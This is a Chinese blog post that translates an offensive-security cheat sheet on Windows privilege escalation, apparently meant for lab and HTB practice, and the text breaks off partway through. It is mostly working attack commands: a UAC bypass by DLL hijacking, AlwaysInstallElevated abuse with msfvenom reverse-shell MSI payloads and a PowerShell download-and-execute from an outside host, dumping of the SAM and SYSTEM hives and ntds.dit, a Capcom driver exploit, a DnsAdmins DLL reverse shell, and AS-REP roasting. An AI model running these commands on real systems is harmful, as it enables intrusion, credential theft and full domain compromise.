

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="ç¬”è®°è¯´æ˜ï¼šè¯¥ç¬”è®°æ˜¯å›½å¤–è¿›æ”»æ€§çˆ±å¥½è€… h4rithd åœ¨ gitbook ä¸Šè®°å½•çš„å¤‡å¿˜ç¬”è®°ï¼Œæˆ‘æ•´ä½“ç¿»è¯‘äº†æ³¨é‡Šçš„å†…å®¹ï¼Œå¹¶æ ¹æ®ä¸ªäººæ‰“é¶å­¦ä¹ æƒ…å†µï¼Œå¢åŠ æˆ–åˆ é™¤äº†ä¸€éƒ¨åˆ†å†…å®¹ï¼Œè‡³æ­¤æ”¾ç½®åšå®¢ä¸Šç•™ä½œåç»­å¤ä¹ ä½¿ç”¨ï¼Œä»¥åŠæ–¹ä¾¿å„ä½æµè§ˆåˆ°æˆ‘åšå®¢çš„å®‰å…¨çˆ±å¥½è€…å‚è€ƒä½¿ç”¨ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="Windowsç‰¹æƒæå‡-h4rithd-2024.04.03ç‰ˆæœ¬">
<meta property="og:url" content="https://sh1yan.top/2024/06/02/Windows-privilege-escalation-h4rithd-20240403/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="ç¬”è®°è¯´æ˜ï¼šè¯¥ç¬”è®°æ˜¯å›½å¤–è¿›æ”»æ€§çˆ±å¥½è€… h4rithd åœ¨ gitbook ä¸Šè®°å½•çš„å¤‡å¿˜ç¬”è®°ï¼Œæˆ‘æ•´ä½“ç¿»è¯‘äº†æ³¨é‡Šçš„å†…å®¹ï¼Œå¹¶æ ¹æ®ä¸ªäººæ‰“é¶å­¦ä¹ æƒ…å†µï¼Œå¢åŠ æˆ–åˆ é™¤äº†ä¸€éƒ¨åˆ†å†…å®¹ï¼Œè‡³æ­¤æ”¾ç½®åšå®¢ä¸Šç•™ä½œåç»­å¤ä¹ ä½¿ç”¨ï¼Œä»¥åŠæ–¹ä¾¿å„ä½æµè§ˆåˆ°æˆ‘åšå®¢çš„å®‰å…¨çˆ±å¥½è€…å‚è€ƒä½¿ç”¨ã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-06-02T15:50:55.000Z">
<meta property="article:modified_time" content="2024-06-02T15:01:09.302Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="Offensive security">
<meta property="article:tag" content="Windows privilege escalation">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>Windowsç‰¹æƒæå‡-h4rithd-2024.04.03ç‰ˆæœ¬ - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>å‹é“¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>å…¶ä»–</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>æˆ‘çš„å¼€æºå·¥å…·åˆ—è¡¨</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>åå¼¹shellå‘½ä»¤é›†åˆ</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>ç®€æ˜“åå¼¹shellé›†åˆ</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>ç½‘ç«™å¼€å‘è€…å·¥å…·ç®±</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linuxå‘½ä»¤å·¥å…·ç®±</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChefå·¥å…·ç®±</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>å¼€å‘è€…é€ŸæŸ¥å¤‡å¿˜å½•</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMapå‘½ä»¤ç”Ÿæˆå™¨</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/nuclei/" target="_self">
                    
                    <span>Nucleiå‘½ä»¤ç”Ÿæˆå™¨</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 æ¼æ´è¯„åˆ†</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Windowsç‰¹æƒæå‡-h4rithd-2024.04.03ç‰ˆæœ¬"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-02 23:50" pubdate>
          2024å¹´6æœˆ2æ—¥ æ™šä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          33k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          274 åˆ†é’Ÿ
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Windowsç‰¹æƒæå‡-h4rithd-2024.04.03ç‰ˆæœ¬</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="ç¬”è®°è¯´æ˜ï¼š"><a href="#ç¬”è®°è¯´æ˜ï¼š" class="headerlink" title="ç¬”è®°è¯´æ˜ï¼š"></a>ç¬”è®°è¯´æ˜ï¼š</h1><p>è¯¥ç¬”è®°æ˜¯å›½å¤–è¿›æ”»æ€§çˆ±å¥½è€… h4rithd åœ¨ gitbook ä¸Šè®°å½•çš„å¤‡å¿˜ç¬”è®°ï¼Œæˆ‘æ•´ä½“ç¿»è¯‘äº†æ³¨é‡Šçš„å†…å®¹ï¼Œå¹¶æ ¹æ®ä¸ªäººæ‰“é¶å­¦ä¹ æƒ…å†µï¼Œå¢åŠ æˆ–åˆ é™¤äº†ä¸€éƒ¨åˆ†å†…å®¹ï¼Œè‡³æ­¤æ”¾ç½®åšå®¢ä¸Šç•™ä½œåç»­å¤ä¹ ä½¿ç”¨ï¼Œä»¥åŠæ–¹ä¾¿å„ä½æµè§ˆåˆ°æˆ‘åšå®¢çš„å®‰å…¨çˆ±å¥½è€…å‚è€ƒä½¿ç”¨ã€‚</p>
<span id="more"></span>  

<h1 id="PrivilageEsc-Windows-ğŸ‘‘"><a href="#PrivilageEsc-Windows-ğŸ‘‘" class="headerlink" title="PrivilageEsc Windows ğŸ‘‘"></a>PrivilageEsc Windows ğŸ‘‘</h1><p>æ£€æŸ¥åˆ—è¡¨ï¼š<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation</a></p>
<p>ç‚¹å‡»è¿™é‡Œäº†è§£æ›´å¤šï¼<a target="_blank" rel="noopener" href="https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">æœ‰æ•ˆè´Ÿè½½AllTheThings</a></p>
<h2 id="01-å¸¸è§æŠ€å·§"><a href="#01-å¸¸è§æŠ€å·§" class="headerlink" title="01.å¸¸è§æŠ€å·§"></a>01.å¸¸è§æŠ€å·§</h2><h3 id="01-1-UACç»•è¿‡"><a href="#01-1-UACç»•è¿‡" class="headerlink" title="01.1 UACç»•è¿‡"></a>01.1 UACç»•è¿‡</h3><ul>
<li><strong>DLLåŠ«æŒUACç»•è¿‡</strong>ã€‚ (SystemPropertiesAdvanced.exe) å•å‡»<a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">æ­¤å¤„</a>äº†è§£æ›´å¤šä¿¡æ¯ï¼</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## Source : https://egre55.github.io/system-properties-uac-bypass/</span><br><span class="hljs-comment">## ------------------| æ£€æŸ¥ä¸€ä¸‹æˆ‘ä»¬æ˜¯ä¸æ˜¯å­˜åœ¨æ¼æ´ï¼Ÿ</span><br><span class="hljs-built_in">IWR</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.38</span>/sigcheck64.exe <span class="hljs-literal">-outfile</span> sigcheck.exe<br>.\sigcheck.exe <span class="hljs-literal">-accepteula</span> <span class="hljs-literal">-m</span> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe | findstr autoElevate<br><span class="hljs-comment">## å¦‚æœæ˜¯çœŸçš„ï¼›æˆ‘ä»¬å¯ä»¥å‡ºå‘äº†ï¼ï¼</span><br><br><span class="hljs-comment">## ------------------| åˆ›å»ºåé—¨dllæ–‡ä»¶</span><br>https://docs.h4rithd.com/tools/shells<span class="hljs-literal">-payloads</span><span class="hljs-comment">#09.-dll-hijack</span><br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-built_in">copy</span> srrstr.dll C:\Users\&lt;USER&gt;\appdata\local\microsoft\windowsapps\srrstr.dll<br>cmd /c C:\Windows\SysWow64\SystemPropertiesAdvanced.exe <br><span class="hljs-comment">### å¦‚æœæ‚¨æ”¶åˆ°ä»»ä½•é”™è¯¯ï¼Œå³â€œæ­¤æ“ä½œéœ€è¦ä¸€ä¸ªäº¤äº’å¼çª—å£â€ã€‚ </span><br><span class="hljs-comment">### æ‚¨åº”è¯¥ä½¿ç”¨ä»»ä½•ç±»å‹çš„C2ï¼ˆä½¿ç”¨GreatSCT/MBuildæ¥å¯åŠ¨MeterMeterï¼‰        </span><br><br><span class="hljs-comment">## ------------------| ä¸äº¤äº’å¼å¤–å£³ä¸€èµ·ä½¿ç”¨</span><br><span class="hljs-comment">### ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•åˆ›å»ºæœ‰æ•ˆè½½è·å¹¶è·å¾—å¤–å£³</span><br><span class="hljs-comment">### https://docs.h4rithd.com/tools/shells-payloads#10.-greatsct</span><br><span class="hljs-comment">### å°†è¿›ç¨‹è¿ç§»åˆ°explorer.exe</span><br>meterpreter &gt; <span class="hljs-built_in">ps</span> <span class="hljs-literal">-S</span> explorer<br>meterpreter &gt; migrate &lt;PID&gt;<br>meterpreter &gt; shell<br>cmd /c C:\Windows\SysWow64\SystemPropertiesAdvanced.exe<br></code></pre></td></tr></table></figure>

<h3 id="01-2-å¦‚æœ‰ä»¥ä¸‹ç”¨æˆ·æƒé™ï¼Œå³å¯ææƒ"><a href="#01-2-å¦‚æœ‰ä»¥ä¸‹ç”¨æˆ·æƒé™ï¼Œå³å¯ææƒ" class="headerlink" title="01.2 å¦‚æœ‰ä»¥ä¸‹ç”¨æˆ·æƒé™ï¼Œå³å¯ææƒ"></a>01.2 å¦‚æœ‰ä»¥ä¸‹ç”¨æˆ·æƒé™ï¼Œå³å¯ææƒ</h3><ul>
<li><code>AlwaysInstallElevated</code>æŸ¥çœ‹ - MSI å®‰è£…ææƒæ¼æ´<ul>
<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/">æŸ¥çœ‹è¿™ç¯‡æ–‡ç« äº†è§£æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚</a></li>
</ul>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| å¦‚ä½•æ£€æŸ¥</span><br>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br><br><span class="hljs-comment">## ä»åä¸ºâ€œAlwaysInstallElevatedâ€çš„æ³¨å†Œè¡¨å­˜åœ¨çš„è¾“å‡º </span><br><span class="hljs-comment">## åœ¨åŒå­—ï¼ˆREG_WORDï¼‰å€¼ä¸º0x1çš„æƒ…å†µä¸‹ï¼Œ </span><br><span class="hljs-comment">## è¿™æ„å‘³ç€å¯ç”¨äº†AlwaysInstallElevatedç­–ç•¥ã€‚</span><br><span class="hljs-comment">## ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è¿è¡Œmsiæ–‡ä»¶ã€‚</span><br><br><span class="hljs-comment">## ------------------| Exploit </span><br><span class="hljs-comment">## åˆ›å»ºmsfvenomè´Ÿè½½</span><br>msfvenom <span class="hljs-literal">-p</span> windows/meterpreter/reverse_tcp lhost=&lt;IP&gt; lport=&lt;PORT&gt; <span class="hljs-operator">-f</span> msi &gt; pw3n.msi      <br><span class="hljs-comment">## or</span><br>msfvenom <span class="hljs-literal">-p</span> windows/x64/exec CMD=<span class="hljs-string">&quot;cmd /c powershell iex(new-object net.webclient).downloadstring(&#x27;http://10.14.14.7/shell.ps1&#x27;)&quot;</span> <span class="hljs-operator">-f</span> msi &gt; pw3n.msi  <br><br><span class="hljs-comment">## åœ¨Windowså‘½ä»¤æç¤ºç¬¦ä¸‹æ‰§è¡ŒMSIåŒ…æ–‡ä»¶</span><br>msiexec /quiet /qn /i pw3n.msi<br><span class="hljs-comment">## /quiet = åœ¨å®‰è£…è¿‡ç¨‹ä¸­ç¦æ­¢å‘ç”¨æˆ·å‘é€ä»»ä½•æ¶ˆæ¯</span><br><span class="hljs-comment">## /qn = No GUI</span><br><span class="hljs-comment">## /i = å¸¸è§„ï¼ˆä¸ç®¡ç†ï¼‰å®‰è£…</span><br></code></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœæˆ‘ä»¬åœ¨<code>LOCAL SERVICE</code>æˆ–<code>NETWORK SERVICE</code></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| How to check</span><br>whoami /all<br><span class="hljs-comment">## nt authority\local service &lt;--</span><br><br><span class="hljs-comment">## ------------------| æ£€æŸ¥åŸŸç¯å¢ƒæƒé™</span><br><span class="hljs-built_in">wget</span> https://github.com/itm4n/FullPowers/releases/download/v0.<span class="hljs-number">1</span>/FullPowers.exe<br><span class="hljs-comment">## å°†æ­¤ä¸Šä¼ åˆ°è®¡ç®—æœº</span><br>.\FullPowers.exe<br></code></pre></td></tr></table></figure>

<ul>
<li><code>SeBackupPrivilege</code>å¹¶<code>SeRestorePrivilege</code>æœ‰ï¼Ÿ</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| å¦‚ä½•æ£€æŸ¥å·²å¯ç”¨</span><br>whoami /all | findstr <span class="hljs-string">&quot;SeBackupPrivilege SeRestorePrivilege&quot;</span><br><br><span class="hljs-comment">## ------------------| å°†è¿™äº›SYSTEMé…ç½®å•å…ƒå¤åˆ¶åˆ°å½“å‰ç›®å½•</span><br>reg save HKLM\SYSTEM SYSTEM<br>reg save HKLM\SAM SAM<br><br><span class="hljs-comment">#### ç„¶åæˆ‘ä»¬éœ€è¦å¤åˆ¶Active DirectoryåŸŸæ•°æ®åº“ï¼Œä¹Ÿç§°ä¸ºntds.dit</span><br><br><span class="hljs-comment">## ------------------| åœ¨æœ¬åœ°åˆ›å»ºç£ç›˜å·å½±è„šæœ¬</span><br><span class="hljs-built_in">set</span> verbose on<br><span class="hljs-built_in">set</span> metadata C:\Windows\Temp\meta.cab<br><span class="hljs-built_in">set</span> context clientaccessible<br><span class="hljs-built_in">set</span> context persistent<br><span class="hljs-keyword">begin</span> backup<br>add volume C: alias cdrive<br>create<br>expose %cdrive% E:<br><span class="hljs-keyword">end</span> backup<br><br><span class="hljs-comment">## ------------------| å°†è„šæœ¬è½¬æ¢ä¸ºWindowsæ ¼å¼å¹¶ä¸Šä¼ ã€‚</span><br>unix2dos script.txt<br><br><span class="hljs-comment">## ------------------| ä½¿ç”¨Diskshadowå¤‡ä»½Cé©±åŠ¨å™¨</span><br>diskshadow.exe /s script.txt<br><span class="hljs-comment">## ç°åœ¨å¯ä»¥é€šè¿‡E:é©±åŠ¨å™¨è®¿é—®æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿ</span><br><span class="hljs-built_in">ls</span> E:<br><br><span class="hljs-comment">## ------------------| ä½¿ç”¨robocopyå¤‡ä»½ E:\Windows\ntds\ntds.dit file.</span><br>robocopy /B E:\Windows\ntds\ .\ ntds.dit<br><span class="hljs-comment"># ç„¶åä¸‹è½½æ‰€æœ‰SAMã€SYSTEMå’ŒNTDS.DITæ–‡ä»¶ï¼Œç„¶åå¯ä»¥ä½¿ç”¨secretsdump.pyè·å–adminiå“ˆå¸Œ  </span><br><br><span class="hljs-comment">## ------------------| ä½¿ç”¨ wbadmin.exe</span><br><span class="hljs-comment">## åœ¨sambaä¸Šä½¿ç”¨å­˜æ¡£smb</span><br><span class="hljs-comment">## smbå…±äº«ï¼Œè¯¥å…±äº«éœ€è¦æ ¼å¼åŒ–ä¸ºNTFS/ReFSã€‚è¯·æŒ‰ç…§ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ“ä½œã€‚</span><br>dd <span class="hljs-keyword">if</span>=/dev/zero of=ntfs.disk bs=<span class="hljs-number">320</span>M count=<span class="hljs-number">2</span><br>losetup <span class="hljs-literal">-fP</span> ntfs.disk<br>losetup <span class="hljs-literal">-a</span><br>mkfs.ntfs /dev/loop0<br><span class="hljs-built_in">mount</span> /dev/loop0 ./<br><br><span class="hljs-built_in">echo</span> y | wbadmin <span class="hljs-built_in">start</span> backup <span class="hljs-literal">-backuptarget</span>:\\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.22</span>\share\ <span class="hljs-literal">-include</span>:c:\windows\ntds\ntds.dit<br></code></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœä½ æœ‰<code>SeLoadDriverPrivilege</code>ï¼Ÿ</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| ä¸‹è½½å¹¶ä¸Šä¼ ä»¥ä¸‹æ–‡ä»¶åˆ°æœºå™¨</span><br><span class="hljs-built_in">wget</span> https://github.com/FuzzySecurity/Capcom<span class="hljs-literal">-Rootkit</span>/raw/master/Driver/Capcom.sys<br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/h4rithd/Precompiled<span class="hljs-literal">-Binaries</span>/main/Capcom/EoPLoadDriver.exe   <br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/h4rithd/Precompiled<span class="hljs-literal">-Binaries</span>/main/Capcom/ExploitCapcom.exe   <br><br><span class="hljs-comment">## ------------------| åˆ›å»ºæœ‰æ•ˆè´Ÿè½½å¹¶ä¸Šä¼ </span><br>msfvenom  <span class="hljs-literal">--platform</span> windows <span class="hljs-literal">-a</span> x64 <span class="hljs-literal">-p</span> windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; <span class="hljs-operator">-f</span> exe &gt; h4rithd.exe  <br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-built_in">copy</span> h4rithd.exe C:\Windows\Temp\h4rithd.exe <span class="hljs-comment"># è¿è¡Œå‰ï¼Œå…ˆå¯åŠ¨listner</span><br>.\ExploitCapcom.exe<br></code></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœç”¨æˆ·åœ¨<code>DnsAdmins</code>ç»„ä¸­ï¼Ÿ</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Create payload</span><br>msfvenom <span class="hljs-literal">-a</span> x64 <span class="hljs-literal">-p</span> windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; <span class="hljs-operator">-f</span> dll &gt; h4rithd.dll   <br><br><span class="hljs-comment">## ------------------| Create SMB share on local machine </span><br>impacket<span class="hljs-literal">-smbserver</span> share ./<br><br><span class="hljs-comment">## ------------------| åœ¨æ‹¥æœ‰çš„è¿œç¨‹ç›’å­ä¸Šæ‰§è¡Œæ­¤æ“ä½œ</span><br>dnscmd.exe <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> /config /serverlevelplugindll \\&lt;IP&gt;\&lt;Path<span class="hljs-literal">-To-Dll-File</span>&gt;<br>sc.exe stop dns<br><span class="hljs-comment">## åˆ›å»ºnetcat listnerï¼Œç„¶åè¿è¡Œä¸‹æ–¹å‘½ä»¤ </span><br>sc.exe <span class="hljs-built_in">start</span> dns<br></code></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœæ‚¨æœ‰<code>GenericAll</code>ç”¨æˆ· jorden</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| ä¸ºç”¨æˆ·Jordenå¯ç”¨é¢„èº«ä»½éªŒè¯ </span><br><span class="hljs-built_in">Get-ADUser</span> jorden | <span class="hljs-built_in">Set-ADAccountControl</span> <span class="hljs-literal">-DoesNotRequirePreAuth</span> <span class="hljs-variable">$true</span><br><br><span class="hljs-comment">## ------------------| Then run this</span><br>impacket<span class="hljs-literal">-GetNPUsers</span> htb.local/jorden <span class="hljs-literal">-dc-ip</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">3.203</span> <span class="hljs-literal">-no-pass</span>  <br></code></pre></td></tr></table></figure>

<ul>
